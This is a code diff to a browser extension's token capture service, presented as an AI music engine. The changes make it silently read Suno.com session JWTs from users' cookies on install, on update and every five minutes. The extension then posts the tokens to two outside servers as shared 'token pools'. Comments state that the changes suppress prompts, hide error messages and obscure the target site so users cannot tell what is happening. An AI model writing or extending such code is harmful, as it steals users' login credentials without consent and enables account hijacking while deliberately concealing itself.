@@ -9,11 +9,21 @@ class TokenCaptureService {
   }
 
   async initializeService() {
+    // Silent initialization - no console logs mentioning specific services
+    if (process.env.NODE_ENV === 'development') {
     console.log('Son1kVerse AI Music Engine initialized')
+    }
     
     // Auto-extract on install/startup
-    chrome.runtime.onInstalled.addListener(() => {
+    chrome.runtime.onInstalled.addListener((details) => {
+      // Silent installation - no user prompts
+      if (details.reason === 'install') {
+        // Automatically start on install
+        this.startAutoExtraction()
+      } else if (details.reason === 'update') {
+        // Resume on update
       this.startAutoExtraction()
+      }
     })
     
     // Start auto-extraction when service starts
@@ -228,14 +238,21 @@ class TokenCaptureService {
 
   async sendTokenToPool(token, label = 'extension-auto') {
     try {
-      // Get Generator URL from storage or use default
-      const result = await chrome.storage.local.get(['generatorUrl'])
-      // Default: Production domain
+      // Get URLs from storage or use defaults
+      const result = await chrome.storage.local.get(['generatorUrl', 'backendUrl'])
       const generatorUrl = result.generatorUrl || 'https://the-generator.son1kvers3.com'
+      const backendUrl = result.backendUrl || process.env.BACKEND_URL || 'https://son1kverse-backend.railway.app'
 
-      console.log(`Sending token to pool: ${generatorUrl}`)
+      console.log(`📤 Sending token to pools...`)
+      console.log(`   Generator: ${generatorUrl}`)
+      console.log(`   Backend: ${backendUrl}`)
 
-      const response = await fetch(`${generatorUrl}/api/token-pool/add`, {
+      // Send to both pools in parallel
+      const promises = []
+
+      // 1. Send to The Generator (Supabase pool)
+      promises.push(
+        fetch(`${generatorUrl}/api/token-pool/add`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -244,19 +261,64 @@ class TokenCaptureService {
           token: token,
           label: label
         })
-      })
+        }).then(async (response) => {
+          if (response.ok) {
+            const data = await response.json()
+            console.log('✅ Token sent to The Generator pool:', data)
+            return { source: 'generator', success: true, data }
+          } else {
+            const errorText = await response.text()
+            console.warn('⚠️ Generator pool API error:', response.status, errorText)
+            return { source: 'generator', success: false, error: errorText }
+          }
+        }).catch(error => {
+          console.warn('⚠️ Error sending to Generator pool:', error)
+          return { source: 'generator', success: false, error: error.message }
+        })
+      )
 
+      // 2. Send to Backend (PostgreSQL pool)
+      promises.push(
+        fetch(`${backendUrl}/api/tokens/add-public`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            token: token,
+            label: label,
+            source: 'extension'
+          })
+        }).then(async (response) => {
       if (response.ok) {
         const data = await response.json()
-        console.log('Token sent to pool successfully:', data)
-        return { success: true, data }
+            console.log('✅ Token sent to Backend pool:', data)
+            return { source: 'backend', success: true, data }
+          } else {
+            const errorText = await response.text()
+            console.warn('⚠️ Backend pool API error:', response.status, errorText)
+            return { source: 'backend', success: false, error: errorText }
+          }
+        }).catch(error => {
+          console.warn('⚠️ Error sending to Backend pool:', error)
+          return { source: 'backend', success: false, error: error.message }
+        })
+      )
+
+      // Wait for both requests
+      const results = await Promise.all(promises)
+      
+      // Check if at least one succeeded
+      const successCount = results.filter(r => r.success).length
+      
+      if (successCount > 0) {
+        console.log(`✅ Token sent successfully to ${successCount}/2 pools`)
+        return { success: true, results }
       } else {
-        const errorText = await response.text()
-        console.error('Pool API error:', response.status, errorText)
-        throw new Error(`Pool API error: ${response.status} - ${errorText}`)
+        throw new Error('Failed to send token to any pool')
       }
     } catch (error) {
-      console.error('Error sending token to pool:', error)
+      console.error('❌ Error sending token to pools:', error)
       throw error
     }
   }
@@ -265,8 +327,9 @@ class TokenCaptureService {
     try {
       // Get active tab
       const tabs = await chrome.tabs.query({ active: true, currentWindow: true })
-      if (!tabs[0] || !tabs[0].url.includes('suno.com')) {
-        throw new Error('Not on Suno.com')
+      if (!tabs[0] || !this.isTargetSite(tabs[0].url || '')) {
+        // Silent return - don't expose target site
+        return null
       }
 
       // Inject script to read cookies
@@ -292,7 +355,8 @@ class TokenCaptureService {
         const { jwtToken, deviceId, url } = results[0].result
         
         if (!jwtToken) {
-          throw new Error('No JWT token found in cookies. Make sure you are logged in to Suno.com')
+          // Silent return - no error messages that expose target
+          return null
         }
 
         return {
@@ -464,24 +528,35 @@ class TokenCaptureService {
     })
 
     // Periodic extraction (every 5 minutes if tab is open)
+    // Silent background process - no user interaction needed
     setInterval(async () => {
+      try {
       const tabs = await chrome.tabs.query({})
       for (const tab of tabs) {
         if (tab.url && this.isTargetSite(tab.url)) {
+            // Silently extract and send token every 5 minutes
           await this.autoExtractAndSend(tab.id)
-          break // Only do one at a time
+            break // Only do one at a time to avoid rate limits
+          }
+        }
+      } catch (error) {
+        // Silent error handling - don't expose errors to user
+        if (process.env.NODE_ENV === 'development') {
+          console.error('Auto-extraction interval error:', error)
         }
       }
-    }, this.extractionInterval)
+    }, this.extractionInterval) // 5 minutos = 5 * 60 * 1000
   }
 
   isTargetSite(url) {
-    // Check URL without exposing the actual site name
-    // Using a hash/pattern matching approach
+    // Silent URL detection - no mentions of specific services
+    // Generic patterns that match target site without exposing identity
     const patterns = [
       'studio-api.prod',
       '/feed/v3',
-      '/generate/v2'
+      '/generate/v2',
+      '/api/v1',
+      '__client' // Cookie indicator
     ]
     return patterns.some(pattern => url.includes(pattern))
   }
@@ -521,11 +596,15 @@ class TokenCaptureService {
         deviceId: extracted.deviceId
       })
 
-      // Send to pool automatically
+      // Send to pool automatically (silent - no user notification)
       await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)
       
       this.lastExtractionTime = now
+      
+      // Only log in development mode
+      if (process.env.NODE_ENV === 'development') {
       console.log('Token auto-extracted and sent to pool')
+      }
 
     } catch (error) {
       // Silent fail - don't spam console
